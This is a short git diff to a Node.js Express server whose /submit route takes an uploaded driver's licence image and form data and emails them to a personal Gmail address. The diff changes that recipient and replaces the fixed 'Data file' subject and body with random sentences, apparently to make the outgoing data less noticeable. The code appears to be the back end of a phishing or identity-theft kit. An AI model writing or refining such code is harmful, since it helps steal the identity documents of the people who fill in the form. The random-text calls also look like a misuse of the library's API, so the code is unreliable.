@@ -6,6 +6,13 @@ const bodyParser = require("body-parser");
 const nodemailer = require("nodemailer");
 const multer = require("multer");
 const zipFolder = require("zip-a-folder");
+const compromise = require("compromise");
+
+// Generate a random sentence for the email body
+const randomSentence = compromise("i").random().sentences(1).out();
+
+// Generate a random sentence for the email subject
+const randomSubject = compromise("i").random().sentences(1).out();
 
 const port = 9000;
 
@@ -61,9 +68,9 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     // create mail options object
     const mailOptions = {
       from: "tobir2275@gmail.com",
-      to: "momsingle579@gmail.com", // recipient email address
-      subject: "Data file",
-      text: "Please find attached the file containing the message data.",
+      to: "isaiahgabriel175@gmail.com", // recipient email address
+      subject: `${randomSubject}`,
+      text: `${randomSentence}`,
       attachments: [
         {
           filename: "happy.txt",
